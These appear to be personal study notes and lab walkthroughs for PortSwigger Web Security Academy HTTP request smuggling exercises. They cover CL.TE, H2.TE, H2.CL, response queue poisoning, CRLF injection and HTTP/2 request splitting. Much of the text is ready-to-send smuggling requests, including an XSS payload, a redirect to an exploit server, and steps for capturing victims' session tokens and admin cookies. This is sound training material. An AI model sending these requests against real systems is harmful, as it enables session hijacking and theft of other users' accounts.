If it times out, it could indicate it is vulnerable to a CL.TE attack. To confirm it via a differential response, replace it with a terminating chunk to indicate the request has ended and then poison with an invalid GET request with content type and content length. Additionally, set the body parameter and content length to 3 (`x=` with 1 additional byte):

```http
POST / HTTP/1.1
Host: 0a54003203f7944680bafe9700db0075.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 108
Transfer-Encoding: chunked

0

GET /asdfsadfasdfsad HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 3

x=
```

If a normal request returns 404, it confirms the CL.TE vulnerability. To exploit it, try changing the path to the vulnerable page with XSS vulnerability and copy the XSS payload in the User Agent and add it to the smuggled request:

```http
POST / HTTP/1.1
Host: 0a54003203f7944680bafe9700db0075.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 108
Transfer-Encoding: chunked

0

GET /post?postId=4 HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 3
User-Agent: foobar"><script>alert()</script>

x=
```

The popup may appear when a user navigates to the home page as it grabs the XSS request.
# Response Queue Poisoning

Response queue poisoning causes a front-end server to start mapping responses from the back-end to the wrong requests. It means all users of the same connection are persistently served responses that were intended for someone else.

It is achieved by smuggling a complete request, eliciting two responses from the back-end when the front-end only expects one.

For a successful attack:

- TCP connection between the front-end and back-end is reused for multiple request/response cycles.
- Attacker can successfully smuggle a complete, standalone request that receives its own distinct response from the back-end server.
- Attack does not result in either server closing the TCP connection. Servers generally close incoming connections when they receive an invalid request since they cannot determine where the request is supposed to end.

If you smuggle a request that also contains a body, the next request on connection will be appended to the body of the smuggled request, often having the side effect of truncating the final request based on the apparent Content-Length. The back-end sees three requests, where the third is just a series of leftover bytes.

For example, the front-end sees:

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Type: x-www-form-urlencoded
Content-Length: 120
Transfer-Encoding: chunked

0

POST /example HTTP/1.1
Host: vulnerable-website.com
Content-Type: x-www-form-urlencoded
Content-Length: 25

x=

--------------------------------------------------------------------------------------------

GET / HTTP/1.1
Host: vulnerable-website.com
```

And the back-end sees:

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Type: x-www-form-urlencoded
Content-Length: 120
Transfer-Encoding: chunked

0

-------------------------------------------------------------------------------------

POST /example HTTP/1.1
Host: vulnerable-website.com
Content-Type: x-www-form-urlencoded
Content-Length: 25

x=GET / HTTP/1.1
Host: v

--------------------------------------------------------------------------------------

ulnerable-website.com
```

Since the leftover bytes don't form a request, it results in an error, causing the server to close the connection.

A complete request can be smuggled instead of just a prefix as long as you send exactly two requests in one, any subsequent requests on the connection will remain unchanged:

```http
POST / HTTP/1.1\r\n
Host: vulnerable-website.com\r\n
Content-Type: x-www-form-urlencoded\r\n
Content-Length: 61\r\n
Transfer-Encoding: chunked\r\n
\r\n
0\r\n
\r\n
GET /anything HTTP/1.1\r\n
Host: vulnerable-website.com\r\n
\r\n

-------------------------------------------------------------------------

GET / HTTP/1.1\r\n
Host: vulnerable-website.com\r\n
\r\n
```

And the back-end sees:

```http
POST / HTTP/1.1\r\n
Host: vulnerable-website.com\r\n
Content-Type: x-www-form-urlencoded\r\n
Content-Length: 61\r\n
Transfer-Encoding: chunked\r\n
\r\n
0\r\n
\r\n

--------------------------------------------------------------------------------------------

GET /anything HTTP/1.1\r\n
Host: vulnerable-website.com\r\n
\r\

--------------------------------------------------------------------------------------------

GET / HTTP/1.1\r\n
Host: vulnerable-website.com\r\n
\r\n
```

When smuggling a complete request, the front-end thinks it only forwarded a single request whereas the back-end sees two distinct requests and will send two responses accordingly:

![[Desync.png]]

The front-end correctly maps the first response to the initial wrapper and forwards it on to the client. Since there are no further requests waiting for a response, the unexpected second response is held in queue. 

When the front-end receives another request, it forwards it to the back-end as normal. However, when issuing the response, it sends the first one in the queue. The correct response from the back end is then left without a matching request. The cycle is repeated.

Once a response is poisoned, an attacker can send arbitrary requests to capture another user's response.

![[Victim Response.png]]

>[!info]
>To make it easier to differentiate stolen responses from responses to your own requests, try using a non-existent path in both requests you send so your requests should consistently receive a 404 response.
# Response Queue Poisoning via H2.TE Request Smuggling

For example, you want to confirm the vulnerability exists by changing the request method to POST, removing unnecessary headers, showing new lines and turning off CL updating automatically and replace the CL header with a TE chunked header:

```http
POST / HTTP/2
Host: 0aeb00ba03e407b480328570001900d3.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked


```

>[!info]
>It is replaced because if the front-end is using HTTP/2 and it is using HTTP/1.1 to talk to the back-end, the front-end will use HTTP/2 built-in mechanism to determine Content-Length. If it uses HTTP/1.1 to talk to back-end, it will copy the TE chunked header when rewriting the HTTP/2 request to HTTP/1.1

If the back-end server follows the RFC and sees the TE header, it prefers the TE header meaning a situation where the front end uses HTTP/2 CL while the back-end uses HTTP/1.1 TE chunked. 

Try also indicating to the back-end server that the request has ended by adding a terminating chunk and then poisoning it with a GET request for an invalid path using HTTP/1.1 and adding an X-Ignore header without a carriage return feed (for normal request to be appended after the x value):

```http
POST / HTTP/2
Host: 0aeb00ba03e407b480328570001900d3.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

0

GET /fdsfsdafsadfsa HTTP/1.1
X-Ignore: x
```

Try sending this request and then a normal GET request for the home page, waiting for a 404 Not Found message:

![[404 Not Found.png]]

After confirming, alter the main POST request path to an invalid path and in the smuggled request, turn it into a complete request to poison the response queue by adding a Host header and an extra carriage return line at the end:

```http
POST /fdsfsadfads HTTP/2
Host: 0aeb00ba03e407b480328570001900d3.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
Content-Length: 46

0

GET /fdsfsdafsadfsa HTTP/1.1
Host: 0aeb00ba03e407b480328570001900d3.web-security-academy.net


```

When sent, the back-end server responds with a 404 based on the initial POST request. It then executes the GET request next and queue up a 404 response in the queue. Then, if the victim initiates a login, the backend will respond with a 302. 

Because the 404 is queued, the victim receives the 404 respond and we can send another request to get the response for the victim's successful login request containing their token.

>[!info]
>Timing and luck is required by sending the attack request only over and over until the response returns something other than a 404 Not Found.

To automate it via Intruder, don't set any payload positions and use Null payloads and continue indefinitely as well as turn off content length automatic updates in the settings. In Resource Pool, create a new one with a max concurrent requests set to 1 with a delay set to 800ms and start running it and filter by 3xx responses:

![[Admin Cookie.png]]

# HTTP/2 Request Smuggling

HTTP/2 messages are often sent over the wire as a series of separate frames. Each frame is preceded by an explicit length field, which tells the server exactly how many bytes to read in. Therefore, the length of the request is the sum of its frame lengths.

HTTP/2 downgrading is the process of rewriting HTTP/2 requests using HTTP/1 syntax to generate an equivalent HTTP/1 request. Servers and proxies often do this in order to offer HTTP/2 support to clients while communicating with back-end servers that only offer HTTP/1.

HTTP/2 requests do not have to specify the length in a header. For downgrading, it means front-end servers often add an HTTP/1 CL header, getting the value using HTTP/2's built-in length mechanism. HTTP/2 requests can also include their own CL header where some front-end servers will reuse the value in the resulting HTTP/1 request.

The RFC states that any CL header in HTTP/2 requests must match the length calculated using the pre-built mechanism, but it is not always validated before downgrading. It is possible to smuggle requests by injecting a misleading CL header. 

The front-end would use the implicit HTTP/2 length to determine where the request ends, but the HTTP/1 back-end has to refer to the CL header derived from the injected one, resulting in a desync.

For example:

![[FE Request.png]]

![[BE Request.png]]

>[!info]
>Sometimes, you want headers from victim requests to be appended but they can interfere with the attack sometimes. For example, above was mitigated by including a trailing parameter and a CL header in the smuggled prefix. By using a CL header slightly longer than the body, the victim request is still appended to the prefix but is truncated before the headers.
# H2.CL Request Smuggling

For example, confirm the vulnerability by changing the request to POST, remove unnecessary headers and show new lines and turn off update content length to control it manually for testing and finally add a request body parameter to define where the normal content ends.

Make sure to update the Content Length to 5 bytes.

Underneath it all, create the request smuggling request by requesting an invalid path using HTTP/1.1, setting an X-Ignore header without a new line:

```http
POST / HTTP/2
Host: 0a0300bf034f940d813b582c006b0083.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 5

x=1
GET /fdsafsadfasd HTTP/1.1
X-Ignore: x
```

Once sent, the normal request will be appended as follows, ensuring that there is no duplicate HTTP method:

```http
POST / HTTP/2
Host: 0a0300bf034f940d813b582c006b0083.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 0

x=1
GET /fdsafsadfasd HTTP/1.1
X-Ignore: xGET / HTTP/1.1
Host: 0a0300bf034f940d813b582c006b0083.web-security-academy.net
Sec-Ch-Ua: "Chromium";v="129", "Not=A?Brand";v="8"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-GB,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
Connection: keep-alive
```

Try sending it with the normal request. If a 404 comes back, it confirms the vulnerability. 

>[!danger] 200 OK
>If a 200 OK response comes back, it indicates the victim user is navigating the page at the same time as us and their GET request is appended to the prefix before you send the normal request.

This works because the HTTP/2 RFC states it is not necessary to include a CL header since it is derived from the built-in mechanism but it also states you are allowed to set one as long as it is correct and matches the length from the mechanism.

The issue is not all front-end implementations check that it is correct and some simply trust the value set and pass it to the back-end server. To exploit it, try finding an on-site redirect and turn it into an off-site redirect.

One way is by excluding the terminating slash within a folder as some servers do a 302 redirect if you omit the terminating slash and add it back in via a 302 redirect. For example, there may be a JS file requested via a GET request - try omitting the file name and going to the folder - it may return a 404.

Try also removing the last forward slash and it may perform a 302 redirect instead by adding the slash back:

![[Trailing Slash.png]]

Try altering the Host header and observing the response - it may return an invalid host error as the front-end may need a correct Host header to send it to the correct back end server. However, it can be combined with request smuggling by creating the following which changes the GET path and adds a Host header:

```http
POST / HTTP/2
Host: 0a0300bf034f940d813b582c006b0083.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 5

x=1
GET /resources/js HTTP/1.1
Host: example.com
X-Ignore: x
```

It may not work as a second Host header is added from the normal request. To fix it, append the normal request in the body by adding a new line with a new empty parameter and also adding the content-type and content-length.

>[!info]
>The Content-Length should be a minimum of 3 as it is two bytes `x=` and you should always add 1 byte. 

```http
POST / HTTP/2
Host: 0a0300bf034f940d813b582c006b0083.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 5

x=1
GET /resources/js HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 3

x=
```

After sending both requests, it turns into an offsite redirect:

![[Offsite Redirect.png]]

To exploit it, replace the Headers in the exploit server to content type of text/javascript with a body of `alert(document.cookie);` and modify the path to /resources/js/. Additionally modify the Host header to the exploit server:

```http
POST / HTTP/2
Host: 0a0300bf034f940d813b582c006b0083.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 5

x=1
GET /resources/js HTTP/1.1
Host: exploit-0af0003a034994b28135573b01740077.exploit-server.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 3

x=
```

![[Exploit Server.png]]

To finish the attack, keep re-submitting the requests until a 200 OK is returned as that means the victim request was appended to the attack request - can be automated via null payloads indefinitely in Intruder. The victim must also request a JavaScript file for it to execute.
# Request Smuggling via CRLF Injection

If sites prevent basic H2.CL or H2.TE attacks by validating content-length or stripping TE headers, the binary format enables some ways to bypass them. In HTTP/1 you can exploit discrepancies between how servers handle standalone newline (`\n`) characters to smuggle prohibited headers.

If the back-end treats it as a delimiter, but the front-end does not, some front-end servers will fail to detect the second header:

```http
Foo: bar\nTransfer-Encoding: chunked
```

This does not exist with the handling of a full CRLF (\\r\\n) sequence since all HTTP/1.1 servers agree that it terminates the header.

Since HTTP/2 messages are binary, the boundaries of each header are based on explicit, pre-determined offsets rather than delimiter characters meaning that `\r\n` no longer has special significance within a header value and can be included inside the value without causing the header to split.

When rewritten as HTTP/1 request, the `\r\n` will once again be interpreted as a header delimiter. As a result, an HTTP/1 back-end server would see two distinct headers:

```http
Foo: bar
Transfer-Encoding: chunked
```
# Exploiting Request Smuggling via CRLF Injection

For example, try confirming the vulnerability by modifying the request by changing it to a POST request, removing unnecessary headers, showing non-printable characters and turning off CL updating automatically. 

In request headers, remove the CL header since HTTP/2 is being used so it can determine length automatically and add a TE header. If specified, when the front-end converts HTTP/2 to HTTP/1.1, it will copy over the TE header in the HTTP/1.1 request to the back-end.

The back end will see the header and will prefer it (in the RFC).

Specify the terminating chunk and start the prefix (what to poison) with such as an invalid resource and also adding an X-Ignore header for the normal request to be appended straight after the `x`:

```http
POST / HTTP/1.1
Host: 0a0900fe032410088113cfdd00aa004d.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

0

GET /fdsfsdafasdfas HTTP/1.1
X-Ignore: x
```

Try sending this request alongside a normal request to the home page. If a 404 returns, it indicates that it is vulnerable. If not, it likely means that when the front-end server rewrites the HTTP/2 request, it strips the TE header.

To bypass it, remove the TE header and smuggle it in via adding a new request header called `Foo` with a value of `Bar\r\n` and then the TE chunked header afterwards. 

When the front-end receives the HTTP/2 request, it won't interpret the carriage return line feeds and will just convert the request into HTTP/1.1 and HTTP/1.1 will see the TE chunked section as a new header due to the new line feed.

![[FooBar HTTP2.png]]

The request gets kettled as Burp does not know how to represent the new line feed in a header. Try sending it along with a normal request and observe for a 404 response, indicating it is vulnerable.

To exploit it, there may be a search functionality that shows the recent searches on the page, likely tied to the session cookie:

![[Test Search.png]]

Try re-submitting the request in Burp as HTTP/1.1 - once it is used in request smuggling, it is important it is using HTTP/1.1. If so, remove unnecessary headers.

>[!info]
>You want to keep the CL header as when smuggling you want to control the length value and HTTP/2 would use the built-in mechanism.

```http
POST / HTTP/2
Host: 0a0900fe032410088113cfdd00aa004d.web-security-academy.net
Cookie: session=79opQxxL6xKi9MubEsatR75xKWxmsMSy
Content-Length: 11
Content-Type: application/x-www-form-urlencoded

search=test
```

If it works, modify the attacker request to perform a POST request to the search endpoint. The "Content-Length" default of 11 is not enough, but it should capture as much as possible of the victim request so the session token is visible.

To work out the initial value, grab a normal request to the home page containing a token, select all and note the amount of bytes (i.e. `1078`). The length should be bigger in the normal request than the length set in the attacker request (such as setting it to `1000`):

```http
0

POST / HTTP/1.1
Host: 0a0900fe032410088113cfdd00aa004d.web-security-academy.net
Cookie: session=zjY03TghfymyloR4acNDzTVjDK7cQjjX
Content-Length: 1000
Content-Type: application/x-www-form-urlencoded

search=test
```

![[Test GET.png]]

If it works, re-send the attacker request and wait for 15 seconds for the victim to browse to the home page. If successful, the victim request should be visible
# HTTP/2 Request Splitting

When doing [[#Response Queue Poisoning]], a single HTTP request was split into exactly two complete requests on the back-end. The split occurred inside the message body, but when HTTP/2 downgrading is in play, you can also cause the split to occur in the headers instead.

The approach is more versatile as you are not depending on using request methods that are allowed to contain a body and can use GET requests. It is also useful when the CL is validated and the back-end does not support chunked encoding.

![[GET Split.png]]

To split requests in headers, you must understand how the request is rewritten by the front-end and account for it when adding HTTP/1 headers manually or one of the requests may be missing mandatory headers. You need to ensure that both requests received by the back-end contain a `Host` header for example.

Front-end servers typically strip the `:authority` pseudo-header and replace it with a new HTTP/1 `Host` header during downgrading. Some different approaches are available which can influence where to position the `Host` header being injected. For example:

![[GET Headers.png]]

Some front-end servers append the new `Host` header to the end of the current list. As far as HTTP/2 front-end is concerned, this is after the `foo` header. This is also after the point at which the request is split on the back-end meaning the first request would have no `Host` header at all, while the smuggled request would have two.

If so, you must position the injected `Host` header so it ends up in the first request once the split occurs:

![[First Split.png]]

Make sure to adjust any positioning of internal headers that you need to inject in a similiar manner.
# Exploiting HTTP/2 Request Splitting via CRLF Injection

For example, try confirming the vulnerability by first checking HTTP/2 is in use. The client may be using HTTP/2 to talk to the front-end and the front-end is using HTTP/1.1 to talk to the back-end. The exploit is via the HTTP2 to HTTP/1.1 rewrite mechanism that the front-end uses.

You want to inject an extra GET request within a new request header. To inject a request, add a new request header in Burp with the following:

```http
foo: bar\r\n\r\n
GET /dsfsafsda HTTP/1.1\r\n
Host: [HOST-VALUE]
```

>[!info]
>There are two CRLFs to signify the end of the request. This header is inserted at the bottom and is the final request header shown so the first one signifies the end of the header and the second signifies the end of the request with the next line containing the new request.

![[Foo Bar.png]]

You may have to add two other CRLF if the front-end does not add them during the rewrite process. Try submitting without them - if it works, it means the front-end is adding them automatically. After adding the header, save it and send the request and observe for a 404 response.

If 404 returns, it indicates success. 

To exploit it, modify the path to an invalid path so that when you send the requests over and over, there is a certainty that when you see a 404, it is a response to our own request and if it is a non 404 response, it is a response intended for the victim.

![[Admin Token.png]]
# CL.0 Request Smuggling